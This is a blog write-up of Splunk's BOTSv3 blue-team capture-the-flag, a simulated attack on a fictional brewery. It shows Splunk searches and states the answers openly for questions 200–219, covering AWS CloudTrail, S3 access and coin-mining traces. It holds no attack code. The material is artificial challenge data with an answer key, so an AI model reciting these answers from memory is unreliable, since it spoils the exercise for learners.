---
title: "Splunk BOTSv3 Write-Up"
categories: ["IT and Cyber Security"]
date: 2020-09-08
---

<br>

Splunk have several "Boss of the SOC" datasets, simulating a security incident - think of it as a Blue Team/SIEM-based CTF. This is my write-up for BOTSv3, at the time of writing the most recent dataset available. It seems that Taedonggang, a North Korean group, have attacked Frothly, a beer maker...

The official BOTSv3 page is here: [https://github.com/splunk/botsv3](https://github.com/splunk/botsv3)

---

I wrote this on Notion, and it is best viewed there, as it is always up-to-date and is visually best. See it here:

- [https://www.notion.so/jamesdeluk/BOTSv3-2f83c05e301b436bbdb5f4f006bfcd78](https://www.notion.so/jamesdeluk/BOTSv3-2f83c05e301b436bbdb5f4f006bfcd78)

<!-- It's also on Medium:

- [Medium](medium) -->

Or available as a PDF:

- [PDF on Google Drive](https://drive.google.com/file/d/1SnVvJS-d1UGcp9bOgV7FtQM386C_rv_N/view?usp=sharing)

## Contents

- [Info](#info)
- [Initial Recon](#initial-recon)
	- [Events](#events)
	- [Timeline](#timeline)
	- [Hosts and Sourcetypes](#hosts-and-sourcetypes)
- [General Process](#general-process)
- [Questions](#questions)
	- [200 -|- List out the IAM users that accessed an AWS service (successfully or unsuccessfully) in Frothlys AWS environment?](#200----list-out-the-iam-users-that-accessed-an-aws-service-successfully-or-unsuccessfully-in-frothlys-aws-environment)
	- [201 -|- What field would you use to alert that AWS API activity have occurred without MFA (multi-factor authentication)?](#201----what-field-would-you-use-to-alert-that-aws-api-activity-have-occurred-without-mfa-multi-factor-authentication)
	- [202 -|- What is the processor number used on the web servers?](#202----what-is-the-processor-number-used-on-the-web-servers)
	- [203 -|- Bud accidentally makes an S3 bucket publicly accessible. What is the event ID of the API call that enabled public access?](#203----bud-accidentally-makes-an-s3-bucket-publicly-accessible-what-is-the-event-id-of-the-api-call-that-enabled-public-access)
	- [204 -|- What is the name of the S3 bucket that was made publicly accessible?](#204----what-is-the-name-of-the-s3-bucket-that-was-made-publicly-accessible)
	- [205 -|- What is the name of the text file that was successfully uploaded into the S3 bucket while it was publicly accessible?](#205----what-is-the-name-of-the-text-file-that-was-successfully-uploaded-into-the-s3-bucket-while-it-was-publicly-accessible)
	- [206 -|- What is the size (in megabytes) of the .tar.gz file that was successfully uploaded into the S3 bucket while it was publicly accessible?](#206----what-is-the-size-in-megabytes-of-the-targz-file-that-was-successfully-uploaded-into-the-s3-bucket-while-it-was-publicly-accessible)
	- [208 -|- A Frothly endpoint exhibits signs of coin mining activity. What is the name of the first process to reach 100 percent CPU processor utilization time from this activity on this endpoint?](#208----a-frothly-endpoint-exhibits-signs-of-coin-mining-activity-what-is-the-name-of-the-first-process-to-reach-100-percent-cpu-processor-utilization-time-from-this-activity-on-this-endpoint)
	- [209 -|- When a Frothly web server EC2 instance is launched via auto scaling, it performs automated configuration tasks after the instance starts. How many packages and dependent packages are installed by the cloud initialization script?](#209----when-a-frothly-web-server-ec2-instance-is-launched-via-auto-scaling-it-performs-automated-configuration-tasks-after-the-instance-starts-how-many-packages-and-dependent-packages-are-installed-by-the-cloud-initialization-script)
	- [210 -|- What is the short hostname of the only Frothly endpoint to actually mine Monero cryptocurrency?](#210----what-is-the-short-hostname-of-the-only-frothly-endpoint-to-actually-mine-monero-cryptocurrency)
	- [211 -|- How many cryptocurrency mining destinations are visited by Frothly endpoints?](#211----how-many-cryptocurrency-mining-destinations-are-visited-by-frothly-endpoints)
	- [212 -|- Using Splunks event order functions, what is the first seen signature ID of the coin miner threat according to Frothlys Symantec Endpoint Protection (SEP) data?](#212----using-splunks-event-order-functions,-what-is-the-first-seen-signature-id-of-the-coin-miner-threat-according-to-frothlys-symantec-endpoint-protection-sep-data)
	- [213 -|- According to Symantecs website, what is the severity of this specific coin miner threat?](#213----according-to-symantecs-website-what-is-the-severity-of-this-specific-coin-miner-threat)
	- [214 -|- What is the short hostname of the only Frothly endpoint to show evidence of defeating the cryptocurrency threat?](#214----what-is-the-short-hostname-of-the-only-frothly-endpoint-to-show-evidence-of-defeating-the-cryptocurrency-threat)
	- [215 -|- What is the FQDN of the endpoint that is running a different Windows operating system edition than the others?](#215----what-is-the-fqdn-of-the-endpoint-that-is-running-a-different-windows-operating-system-edition-than-the-others)
	- [216 -|- According to the Cisco NVM flow logs, for how many seconds does the endpoint generate Monero cryptocurrency?](#216----according-to-the-cisco-nvm-flow-logs-for-how-many-seconds-does-the-endpoint-generate-monero-cryptocurrency)
	- [217 -|- What kind of Splunk visualization was in the first file attachment that Bud emails to Frothly employees to illustrate the coin miner issue?](#217----what-kind-of-splunk-visualization-was-in-the-first-file-attachment-that-bud-emails-to-frothly-employees-to-illustrate-the-coin-miner-issue)
	- [218 -|- What IAM user access key generates the most distinct errors when attempting to access IAM resources?](#218----what-iam-user-access-key-generates-the-most-distinct-errors-when-attempting-to-access-iam-resources)
	- [219 -|- Bud accidentally commits AWS access keys to an external code repository. Shortly after, he receives a notification from AWS that the account had been compromised. What is the support case ID that Amazon opens on his behalf?](#219----bud-accidentally-commits-aws-access-keys-to-an-external-code-repository-shortly-after-he-receives-a-notification-from-aws-that-the-account-had-been-compromised-what-is-the-support-case-id-that-amazon-opens-on-his-behalf)
	- [220 -|- AWS access keys consist of two parts: an access key ID (e.g., AKIAIOSFODNN7EXAMPLE) and a secret access key (e.g., wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY). What is the secret access key of the key that was leaked to the external code repository?](#220----aws-access-keys-consist-of-two-parts-an-access-key-id-eg-akiaiosfodnn7example-and-a-secret-access-key-eg-wjalrxutnfemik7mdengbpxrficyexamplekey-what-is-the-secret-access-key-of-the-key-that-was-leaked-to-the-external-code-repository)
	- [221 -|- Using the leaked key, the adversary makes an unauthorized attempt to create a key for a specific resource. What is the name of that resource?](#221----using-the-leaked-key-the-adversary-makes-an-unauthorized-attempt-to-create-a-key-for-a-specific-resource-what-is-the-name-of-that-resource)
	- [222 -|- Using the leaked key, the adversary makes an unauthorized attempt to describe an account. What is the full user agent string of the application that originated the request?](#222----using-the-leaked-key-the-adversary-makes-an-unauthorized-attempt-to-describe-an-account-what-is-the-full-user-agent-string-of-the-application-that-originated-the-request)
	- [223 -|- The adversary attempts to launch an Ubuntu cloud image as the compromised IAM user. What is the codename for that operating system version in the first attempt?](#223----the-adversary-attempts-to-launch-an-ubuntu-cloud-image-as-the-compromised-iam-user-what-is-the-codename-for-that-operating-system-version-in-the-first-attempt)
	- [224 -|- Frothly uses Amazon Route 53 for their DNS web service. What is the average length of the distinct third-level subdomains in the queries to brewertalk.com?](#224----frothly-uses-amazon-route-53-for-their-dns-web-service-what-is-the-average-length-of-the-distinct-third-level-subdomains-in-the-queries-to-brewertalkcom)
	- [225 -|- Using the payload data found in the memcached attack, what is the name of the .jpeg file that is used by Taedonggang to deface other brewery websites?](#225----using-the-payload-data-found-in-the-memcached-attack-what-is-the-name-of-the-jpeg-file-that-is-used-by-taedonggang-to-deface-other-brewery-websites)
	- [300 -|- What is the full user agent string that uploaded the malicious link file to OneDrive?](#300----what-is-the-full-user-agent-string-that-uploaded-the-malicious-link-file-to-onedrive)
	- [301 -|- What external client IP address is able to initiate successful logins to Frothly using an expired user account?](#301----what-external-client-ip-address-is-able-to-initiate-successful-logins-to-frothly-using-an-expired-user-account)
	- [302 -|- According to Symantecs website, what is the discovery date of the malware identified in the macro-enabled file?](#302----according-to-symantecs-website-what-is-the-discovery-date-of-the-malware-identified-in-the-macro-enabled-file)
	- [303 -|- What is the password for the user that was successfully created by the user root on the on-premises Linux system?](#303----what-is-the-password-for-the-user-that-was-successfully-created-by-the-user-root-on-the-on-premises-linux-system)
	- [304 -|- What is the name of the user that was created after the endpoint was compromised?](#304----what-is-the-name-of-the-user-that-was-created-after-the-endpoint-was-compromised)
	- [305 -|- What is the process ID of the process listening on a leet port?](#305----what-is-the-process-id-of-the-process-listening-on-a-leet-port)
	- [306 -|- A search query originating from an external IP address of Frothlys mail server yields some interesting search terms. What is the search string?](#306----a-search-query-originating-from-an-external-ip-address-of-frothlys-mail-server-yields-some-interesting-search-terms-what-is-the-search-string)
	- [307 -|- What is the MD5 value of the file downloaded to Fyodors endpoint system and used to scan Frothlys network?](#307----what-is-the-md5-value-of-the-file-downloaded-to-fyodors-endpoint-system-and-used-to-scan-frothlys-network)
	- [308 -|- Based on the information gathered for question 304, what groups was this user assigned to after the endpoint was compromised?](#308----based-on-the-information-gathered-for-question-304-what-groups-was-this-user-assigned-to-after-the-endpoint-was-compromised)
	- [309 -|- At some point during the attack, a users domain account is disabled. What is the email address of the user whose account gets disabled and what is the email address of the user who disabled their account?](#309----at-some-point-during-the-attack-a-users-domain-account-is-disabled-what-is-the-email-address-of-the-user-whose-account-gets-disabled-and-what-is-the-email-address-of-the-user-who-disabled-their-account)
	- [310 -|- Another set of phishing emails were sent to Frothly employees after the adversary gained a foothold on a Frothly computer. This malicious content was detected and left behind a digital artifact. What is the name of this file?](#310----another-set-of-phishing-emails-were-sent-to-frothly-employees-after-the-adversary-gained-a-foothold-on-a-frothly-computer-this-malicious-content-was-detected-and-left-behind-a-digital-artifact-what-is-the-name-of-this-file)
	- [311 -|- Based on the answer to question 310, what is the name of the executable that was embedded in the malware?](#311----based-on-the-answer-to-question-310-what-is-the-name-of-the-executable-that-was-embedded-in-the-malware)
	- [312 -|- How many unique IP addresses used the malicious link file that was sent?](#312----how-many-unique-ip-addresses-used-the-malicious-link-file-that-was-sent)
	- [314 -|- What port number did the adversary use to download their attack tools?](#314----what-port-number-did-the-adversary-use-to-download-their-attack-tools)
	- [315 -|- During the attack, two files are remotely streamed to the /tmp directory of the on-premises Linux server by the adversary. What are the names of these files?](#315----during-the-attack-two-files-are-remotely-streamed-to-the-tmp-directory-of-the-on-premises-linux-server-by-the-adversary-what-are-the-names-of-these-files)
	- [316 -|- Based on the information gathered for question 314, what file can be inferred to contain the attack tools?](#316----based-on-the-information-gathered-for-question-314-what-file-can-be-inferred-to-contain-the-attack-tools)
	- [317 -|- What is the first executable uploaded to the domain admin accounts compromised endpoint system?](#317----what-is-the-first-executable-uploaded-to-the-domain-admin-accounts-compromised-endpoint-system)
	- [318 -|- From what country is a small brute force or password spray attack occurring against the Frothly web servers?](#318----from-what-country-is-a-small-brute-force-or-password-spray-attack-occurring-against-the-frothly-web-servers)
	- [319 -|- The adversary created a BCC rule to forward Frothlys email to his personal account. What is the value of the Name parameter set to?](#319----the-adversary-created-a-bcc-rule-to-forward-frothlys-email-to-his-personal-account-what-is-the-value-of-the-name-parameter-set-to)
	- [320 -|- What is the password for the user that was created on the compromised endpoint?](#320----what-is-the-password-for-the-user-that-was-created-on-the-compromised-endpoint)
	- [321 -|- The Taedonggang adversary sent Grace Hoppy an email bragging about the successful exfiltration of customer data. How many Frothly customer emails were exposed or revealed?](#321----the-taedonggang-adversary-sent-grace-hoppy-an-email-bragging-about-the-successful-exfiltration-of-customer-data-how-many-frothly-customer-emails-were-exposed-or-revealed)
	- [322 -|- What is the path of the URL being accessed by the command and control server?](#322----what-is-the-path-of-the-url-being-accessed-by-the-command-and-control-server)
	- [323 -|- At least two Frothly endpoints contact the adversarys command and control infrastructure. What are their short hostnames?](#323----at-least-two-frothly-endpoints-contact-the-adversarys-command-and-control-infrastructure-what-are-their-short-hostnames)
	- [324 -|- Who is Al Bungsteins cell phone provider/carrier?](#324----who-is-al-bungsteins-cell-phone-providercarrier)
	- [325 -|- Microsoft cloud services often have a delay or lag between index time and event creation time. For the entire day, what is the max lag, in minutes, for the sourcetype: ms:aad:signin?](#325----microsoft-cloud-services-often-have-a-delay-or-lag-between-index-time-and-event-creation-time-for-the-entire-day-what-is-the-max-lag-in-minutes-for-the-sourcetype-msaadsignin)
	- [326 -|- According to Mallorys advertising research, how is beer meant to be enjoyed?](#326----according-to-mallorys-advertising-research-how-is-beer-meant-to-be-enjoyed)
	- [328 -|- What text is displayed on line 2 of the file used to escalate tomcat8s permissions to root?](#328----what-text-is-displayed-on-line-2-of-the-file-used-to-escalate-tomcat8s-permissions-to-root)
	- [329 -|- One of the files uploaded by Taedonggang contains a word that is a much larger in font size than any other in the file. What is that word?](#329----one-of-the-files-uploaded-by-taedonggang-contains-a-word-that-is-a-much-larger-in-font-size-than-any-other-in-the-file-what-is-that-word)
	- [330 -|- What Frothly VPN user generated the most traffic?](#330----what-frothly-vpn-user-generated-the-most-traffic)
	- [331 -|- Using Splunk commands only, what is the upper fence (UF) value of the interquartile range (IQR) of the count of event code 4688 by Windows hosts over the entire day? Use a 1.5 multiplier.](#331----using-splunk-commands-only-what-is-the-upper-fence-uf-value-of-the-interquartile-range-iqr-of-the-count-of-event-code-4688-by-windows-hosts-over-the-entire-day-use-a-1.5-multiplier)
	- [332 -|- What is the CVE of the vulnerability that escalated permissions on Linux host hoth?](#332----what-is-the-cve-of-the-vulnerability-that-escalated-permissions-on-linux-host-hoth)
	- [333 -|- What is the CVE of the vulnerability that was exploited to run commands on Linux host hoth?](#333----what-is-the-cve-of-the-vulnerability-that-was-exploited-to-run-commands-on-linux-host-hoth)
- [Timeline](#timeline)
- [Key Learnings](#key-learnings)

## Info

- I used the downloadable BOTS VM from CyberDefenders - [https://cyberdefenders.org/labs/8](https://cyberdefenders.org/labs/8). Much easier than installing it all manually!
- As the dataset only includes the BOTSv3 data, all searches have `index=botsv3` omitted.
- Answers are not hidden. I think the process is more important than finding the correct answer, in this case.
- After completing the questions and this writeup, I went back to do some more discovery. These are found in the **Bonus** sections of related questions.

## Initial Recon

### Events

`| eventcount index=botsv3`: 2,030,269 events

`index=botsv3`: 2,798,824 events

<br>

### Timeline

**Date**: 20th August 2018

**Time**: Most between 0900 and 1600

<br>

### Hosts and Sourcetypes

**30 hosts**
- hoth
- serverless
- matar
- ABUNGST-L
- BGIST-L
- BSTOLL-L
- BTUN-L
- FYODOR-L
- JWORTOS-L
- MKRAEUS-L
- PCERF-L
- gacrux.i-06fea586f3d3c8ce8
- gacrux.i-0920036c8ca91e501
- gacrux.i-09cbc261e84259b54
- gacrux.i-0cc93bade2b3cba63
- mars.i-08e52f8b5a034012d
- ip-172-16-0-109.ec2.internal
- ip-172-16-0-127
- ip-172-16-0-13
- ip-172-16-0-145
- ip-172-16-0-178
- ip-172-31-12-76
- ip-172-31-36-235
- SEPM
- FROTHLY-FW1
- splunk.froth.ly
- splunkhwf.froth.ly
- console.us.code42.com:443
- ntesla (2 events, connection to botsv3.ministerofmayhem.com)
- OD-FM-NA-i-0ad2d665d4bdace22.amazonaws.com (1 event, error about Splunk)

<br>

**107 sourcetypes**
- access_combined
- alternatives
- amazon-ssm-agent
- amazon-ssm-agent-too_small
- apache_error
- aws:cloudtrail
- aws:cloudwatch
- aws:cloudwatch:guardduty
- aws:cloudwatchlogs
- aws:cloudwatchlogs:vpcflow
- aws:config:rule
- aws:description
- aws:elb:accesslogs
- aws:rds:audit
- aws:rds:error
- aws:s3:accesslogs
- bandwidth
- bash_history
- bootstrap
- cisco:asa
- cloud-init
- cloud-init-output
- code42:api
- code42:computer
- code42:org
- code42:security
- code42:user
- config_file
- cpu
- cron-too_small
- df
- dmesg
- dpkg
- error-too_small
- errors
- errors-too_small
- ess_content_importer
- hardware
- history-2
- interfaces
- iostat
- lastlog
- linux_audit
- linux_secure
- localhost-5
- lsof
- maillog-too_small
- ms:aad:audit
- ms:aad:signin
- ms:o365:management
- ms:o365:reporting:messagetrace
- netstat
- o365:management:activity
- openports
- osquery:info
- osquery:results
- osquery:warning
- out-3
- package
- perfmonmk:process
- protocol
- ps
- script:getendpointinfo
- script:installedapps
- script:listeningports
- stream:arp
- stream:dhcp
- stream:dns
- stream:http
- stream:icmp
- stream:igmp
- stream:ip
- stream:mysql
- stream:smb
- stream:smtp
- stream:tcp
- stream:udp
- symantec:ep:agent:file
- symantec:ep:agt_system:file
- symantec:ep:behavior:file
- symantec:ep:packet:file
- symantec:ep:risk:file
- symantec:ep:scm_system:file
- symantec:ep:security:file
- symantec:ep:traffic:file
- syslog
- time
- top
- unix:listeningports
- unix:service
- unix:sshdconfig
- unix:update
- unix:uptime
- unix:useraccounts
- unix:version
- userswithloginprivs
- vmstat
- who
- wineventlog
- winhostmon
- xmlwineventlog:microsoft-windows-sysmon/operational
- yum-too_small

<br>

Understanding what's what:

```bash
| tstats values(sourcetype) by host
| tstats values(host) by sourcetype

| tstats count by host sourcetype | sort host -count
| tstats count by sourcetype host | sort sourcetype -count
```

<br>

**Functions**

- *XXX-L* are Windows endpoints
    - 8: ABUNGST-L, BGIST-L, BSTOLL-L, BTUN-L, FYODOR-L, JWORTOS-L, MKRAEUS-L, PCERF-L
    - ABUNGST-L = ABUNGST-L.froth.ly = AzureAD\AlBungstein = abungstein@froth.ly
- *gacrux.i-XXX* are Linux web (Apache) servers
    - *gacrux.i-0920036c8ca91e501* more `stream:mysql` than others
- *mars.i-08e52f8b5a034012d* is Linux DNS/name server?
- *matar* is the mail server?
    - Only host with `stream:smtp`
- *hoth* is Linux DC?
    - Has several sourcetypes no other host has

<br>

**Limited-purpose hosts:**

- *ip-172-16-0-109.ec2.internal*: AWS-related stream:XXX
- *serverless*: AWS
- *splunk.froth.ly*: AWS and Microsoft
- *ip-172-31-36-235*: ms:o365:management
- *sepm*: symantec (Symantec Endpoint Protection Management)
- *frothly-fw1:* cisco:awa
- *splunkhwf.froth.ly, ip-172-16-0-XXX, ip-172-31-12-76* are cisconvmflow:syslog
    - but hoth has more than all of them; ip-XXX have very few
- *console.us.code42.com:443*: code42

## General Process

1. Search key phrases to find sources or sourcetypes
2. Check fields for relevant information

## Questions

### 200 -|- List out the IAM users that accessed an AWS service (successfully or unsuccessfully) in Frothly's AWS environment?

```bash
sourcetype="*aws*" *IAM*
```

Check fields. There's a `user_type` field in `aws:cloudtrail` with an option for `IAMUser`:

```bash
sourcetype="aws:cloudtrail" user_type="IAMUser"
```

Then check the `userName` field for unique users.

> bstoll,btun,splunk_access,web_admin

<br><br>

### 201 -|- What field would you use to alert that AWS API activity have occurred without MFA (multi-factor authentication)?

```bash
sourcetype="*aws*" *MFA*
```

Looking through the events to see where MFA is mentioned, and you find the field name.

> userIdentity.sessionContext.attributes.mfaAuthenticated

More info: [https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudwatch-alarms-for-cloudtrail-additional-examples.html#cloudwatch-alarms-for-cloudtrail-no-mfa-example](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudwatch-alarms-for-cloudtrail-additional-examples.html#cloudwatch-alarms-for-cloudtrail-no-mfa-example)

<br><br>

### 202 -|- What is the processor number used on the web servers?

Common processors are Intel and AMD, so check those first.

```bash
(intel OR amd)
```

This gives over 3000 events. Looking at the sourcetypes to see what stands out, there's `hardware` (3 events) and `osquery:results` (4 events)

Check `hardware`:

```bash
sourcetype="hardware" (intel OR amd)
```

`CPU_TYPE Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz` for hosts: *gacrux.i-06fea586f3d3c8ce8*, *gacrux.i-09cbc261e84259b54*, *gacrux.i-0cc93bade2b3cba63*

Check `osquery:results`:

```bash
sourcetype="osquery:results" (intel OR amd)
```

`cpu_brand: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz` for hosts *gacrux.i-06fea586f3d3c8ce8*, *gacrux.i-0cc93bade2b3cba63*

I think we have the answer, but let's check that those hosts web servers:

```bash
host="gacrux.i-06fea586f3d3c8ce8" OR host="gacrux.i-09cbc261e84259b54"
  OR host="gacrux.i-0cc93bade2b3cba63"
```

The most common process is `httpd`, and `stream:http` has `server: Apache/2.2.34 (Amazon)`. Looks good.

> E5-2676

<br><br>

### 203 -|- Bud accidentally makes an S3 bucket publicly accessible. What is the event ID of the API call that enabled public access?

Searching AWS docs for ACLs we find [https://docs.aws.amazon.com/AmazonS3/latest/dev/acl-overview.html](https://docs.aws.amazon.com/AmazonS3/latest/dev/acl-overview.html). It mentions the `PutBucketAcl` event is for changing access, and the `AllUsers` value is for public access:

```bash
sourcetype="aws:cloudtrail" eventName="PutBucketAcl" AllUsers
```

> ab45689d-69cd-41e7-8705-5350402cf7ac

Time = 13:01:46

<br><br>

### 204 -|- What is the name of the S3 bucket that was made publicly accessible?

Same as previous question

> frothlywebcode

<br><br>

### 205 -|- What is the name of the text file that was successfully uploaded into the S3 bucket while it was publicly accessible?

We know the sourcetype, bucket name, and when it was made public. "While it was" suggests it was later made publicly inaccessible, suggesting at least two `PutBucketAcl` events - making it public, then making it private:

```bash
sourcetype="aws:cloudtrail" eventName="PutBucketAcl"
  "requestParameters.bucketName"="frothlywebcode"
```

2 events, one allowing public access (13:01:46), one stopping (13:57:54). Looking between these times for a text file:

```bash
sourcetype="aws:cloudtrail" earliest="8/20/2018:13:01:46" latest="08/20/2018:13:57:54"
  "requestParameters.bucketName"="frothlywebcode" *.txt
```

Gives nothing. So let's branch out - all AWS sourcetypes, and any mention of *frothlywebcode*:

```bash
sourcetype="*aws*" earliest="08/20/2018:13:01:46" latest="08/20/2018:13:57:54"
  frothlywebcode *.txt
```

3 events. It was uploaded, and if we check the `operation` field and there's 1 `aws:s3:accesslogs` event for PUT.

```bash
sourcetype="aws:s3:accesslogs"
  earliest="08/20/2018:13:01:46" latest="08/20/2018:13:57:54"
  frothlywebcode *.txt operation="REST.PUT.OBJECT"
```

> OPEN_BUCKET_PLEASE_FIX.txt

Time = 13:02:44

<br><br>

### 206 -|- What is the size (in megabytes) of the .tar.gz file that was successfully uploaded into the S3 bucket while it was publicly accessible?

As before, but a .tar.gz file. Only 1 event.

```bash
sourcetype="aws:s3:accesslogs"
  earliest="08/20/2018:13:01:46" latest="08/20/2018:13:57:54"
  frothlywebcode *.tar.gz operation="REST.PUT.OBJECT"
```

Then use Splunk functions to convert it to MB

```bash
sourcetype="aws:s3:accesslogs"
  earliest="08/20/2018:13:01:46" latest="08/20/2018:13:57:54"
  frothlywebcode *.tar.gz operation="REST.PUT.OBJECT"
| eval size_mb = round(object_size/1024/1024,2)
| table key size_mb
```

> 2.93

Filename (`key`) = frothly_html_memcached.tar.gz

Time = 13:04:17

<br><br>

### 208 -|- A Frothly endpoint exhibits signs of coin mining activity. What is the name of the first process to reach 100 percent CPU processor utilization time from this activity on this endpoint?

```bash
cpu
```

A few fields jump out. `cpu_load_percent`, `cpu_user_percent`, `pctCPU`, and `process_cpu_used_percent`. Try all of these with 100:

```bash
cpu_load_percent=100 OR cpu_user_percent=100
  OR pctCPU=100 OR process_cpu_used_percent=100
```

The source/sourcetype `PerfmonMk:Process` has some events and also mentions processes:

```bash
sourcetype="PerfmonMk:Process" process_cpu_used_percent=100
| reverse
```

The first event is Edge, at 09:36:26. At 13:37:50 and 13:38:20 there are 2 events for *chrome#5*, then 129 100% events for *chrome#4*, only finishing at 14:04:11 when *MsMpEng.exe* kicks in, which is part of Windows Defender. My feeling is Edge is unrelated to the mining.

> chrome#5

Time = 13:37:50

Host = BSTOLL-L

<br><br>

### 209 -|- When a Frothly web server EC2 instance is launched via auto scaling, it performs automated configuration tasks after the instance starts. How many packages and dependent packages are installed by the cloud initialization script?

```bash
ec2 packages
```

1232 events. Most are for sourcetype `lsof`, which isn't helpful. The other two, `cloud-init` and `osquery:results` also do not seem to have useful information. However, `cloud-init` sounds promising (as we're looking for cloud initialisation scripts), and there's a similar sourcetype, `cloud-init-output`:

```bash
sourcetype="cloud-init-output" packages
```

There's only 6 events, and manually looking through we find the answer.

> 7 (13)

Times = 13:33:24 (host = gacrux.i-0cc93bade2b3cba63), 14:23:19 (host = gacrux.i-06fea586f3d3c8ce8), 14:25:21 (host = gacrux.i-09cbc261e84259b54)

<br><br>

### 210 -|- What is the short hostname of the only Frothly endpoint to actually mine Monero cryptocurrency?

Q208 suggests it was mining using Chrome, so Google for phrases similar to "popular monero coin miner web browser" and we find several mentions to Coinhive.

```bash
coinhive
```

34 events, across 3 hosts. Most are DNS events, and most are for *BSTOLL-L*, which had 100% CPU in the previous answer - the others are *MKRAEUS-L* and *splunkhwf.froth.ly*. 

It seems *splunkhwf.froth.ly* has `cisconvmflowdata` events relating to BudStoll, so we're down to two hosts, with BSTOLL-L the most likely.

Comparing *BSTOLL-L* and *MKRAEUS-L*, and looking at DNS events relating to the Coinhive servers, the latter only has DNS responses, whereas the former has DNS queries also. Everything is pointing to one answer.

> BSTOLL-L

<br><br>

### 211 -|- How many cryptocurrency mining destinations are visited by Frothly endpoints?

Based on the previous question findings:

```bash
host="BSTOLL-L" source="stream:dns" coinhive
| stats dc(query)

# OR

source="cisconvmflowdata" coinhive
| stats dc(dh)
```

> 6

DNS queries to: coinhive[.]com (2x), ws001.coinhive[.]com, ws005.coinhive[.]com, ws011.coinhive[.]com, ws014.coinhive[.]com, ws019.coinhive[.]com

Times = 13:37:33 ~ 13:39:20

<br><br>

### 212 -|- Using Splunk's event order functions, what is the first seen signature ID of the coin miner threat according to Frothly's Symantec Endpoint Protection (SEP) data?

We know the host `SEPM` has all the SEP data, and we're looking for a signature.

```bash
host="SEPM" *signature*
```

53 events. There are fields `CIDS_Signature_ID` and `CIDS_Signature_String`. The IDs are *30356* and *30358*, for *JSCoinMiner 6* and *JSCoinMiner 8* respectively.

Search all events with `CIDS_Signature_ID`, and find the first one.

```bash
host="SEPM" CIDS_Signature_ID=*
| stats first(CIDS_Signature_ID)
```

> 30358

Events = 46 (23x JSCoinMiner 6, 23x JSCoinMiner 8)

Time = 13:37:40 ~ 13:46:47

<br><br>

### 213 -|- According to Symantec's website, what is the severity of this specific coin miner threat?

Google the phrase "Symantec "Web Attack: JSCoinminer""

[Attack Signature Detail Page](https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=30356)

> Medium

<br><br>

### 214 -|- What is the short hostname of the only Frothly endpoint to show evidence of defeating the cryptocurrency threat?

As Q212. The assumption is Symantec finding the thread is defeating it. Check the fields, there is only a single `Host_Name`

> BTUN-L

<br><br>

### 215 -|- What is the FQDN of the endpoint that is running a different Windows operating system edition than the others?

The endpoints all have Windows logs, so let's see if at least one endpoint is running Windows 10:

```bash
"windows 10"
```

It seems there is a source called "operatingsystem" - useful.

```bash
source="operatingsystem"
| stats values(host) by os
```

So what's his FQDM? Windows logs will probably help:

```bash
host="BSTOLL-L" sourcetype="wineventlog"
```

And this gives us `ComputerName`, which is the FQDN.

*Alternatively...*

```bash
"windows 10"
```

`cisconvmsysdata` also has 11 events:

```bash
source="cisconvmsysdata" "windows 10"
```

Having a look there are fields `ose` with operating system and `vsn` with the user's FQDM:

```bash
source="cisconvmsysdata"
| stats values(vsn) by ose
```

> BSTOLL-L.froth.ly

<br><br>

### 216 -|- According to the Cisco NVM flow logs, for how many seconds does the endpoint generate Monero cryptocurrency?

From Q210:

```bash
source="cisconvmflowdata" coinhive
```

There are a few fields that look interesting, especially `fes`, `fet`, `fss`, `fst`. It seems these stand for flow end seconds, flow end time, flow start seconds, flow start time.

Using some built-in Splunk commands, we can work out the time taken:

```bash
source="cisconvmflowdata" coinhive
| stats min(fss) as starttime, max(fes) as endtime
| eval timetaken = endtime-starttime
| table timetaken
```

> 1667

*Although the answers say 1666...*

Times = 13:37:51 ~ 14:05:23

<br><br>

### 217 -|- What kind of Splunk visualization was in the first file attachment that Bud emails to Frothly employees to illustrate the coin miner issue?

It's an email, so to start with `stream:smtp` with "Bud":

```bash
sourcetype="stream:smtp" bud
```

Checking the `sender` field gives us his email, so replace the search term with that"

```bash
sourcetype="stream:smtp" sender="Bud Stoll <bstoll@froth.ly>"
```

11 events. Perhaps he mentioned "Splunk" in `content` of the email:

```bash
sourcetype="stream:smtp" sender="Bud Stoll <bstoll@froth.ly>" content{}="*splunk*"
```

1 result. There are two attachments, *image002.jpg* and *image003.jpg*. Both are base64 encoded, the encoded text being with the `content` field. Decode them using [https://base64.guru/converter/decode/image](https://base64.guru/converter/decode/image)

**image002.jpg**

![botsv3_img1](/img/botsv3_img1.png)

**image003.jpg**

![botsv3_img2](/img/botsv3_img2.png)

This is the one we're looking for.

> column chart

Time = 13:56:27

Email date = 15/9/2018 02:44:24

<br><br>

### 218 -|- What IAM user access key generates the most distinct errors when attempting to access IAM resources?

Use the same base IAMUser search we used in Q200, but filter out successful events:

```bash
sourcetype="aws:cloudtrail" user_type="IAMUser" errorCode!="success"
```

1040 events. This is all IAMUser `user_type` errors, but the question wants errors when they are "attempting to access IAM resources". There is an `eventSource` field, with ec2, s3, and iam as options. We want iam.

```bash
sourcetype="aws:cloudtrail" user_type="IAMUser" errorCode!="success"
  eventSource="iam.amazonaws.com"
```

17 events. Looking at the events and fields, the user access key is `userIdentity.accessKeyId`, and there are 2 unique `errorCode` values and 6 unique `errorMessage` values.

Use Splunk's stats to find the key with most unique `errorCode` events:

```bash
sourcetype="aws:cloudtrail" user_type="IAMUser" errorCode!="success"
  eventSource="iam.amazonaws.com"
| stats dc(errorCode) as errors by userIdentity.accessKeyId
| sort -errors
```

But they all have 1 each. No winner. Try `errorMessage`:

```bash
sourcetype="aws:cloudtrail" user_type="IAMUser" errorCode!="success"
  eventSource="iam.amazonaws.com"
| stats dc(errorMessage) as errors by userIdentity.accessKeyId
| sort -errors
```

> AKIAJOGCDXJ5NW5PXUPA

Times = 09:16:12 ~ 09:27:07 (for above key)

Events = `ListAccessKeys`, `CreateAccessKey`, `CreateUser`, `DeleteAccessKey`, `GetUser`

Source IPs = 35.153.154.221 (x4), 209.107.196.112, 82.102.18.111

User Agents = Boto3 Linux (x4), Boto3 Windows, ElasticWolf

<br><br>

### 219 -|- Bud accidentally commits AWS access keys to an external code repository. Shortly after, he receives a notification from AWS that the account had been compromised. What is the support case ID that Amazon opens on his behalf?

```bash
aws support case
```

4 events. One is an email from Amazon with case ID. Easy!

> 5244329601

Time = 09:16:55

<br><br>

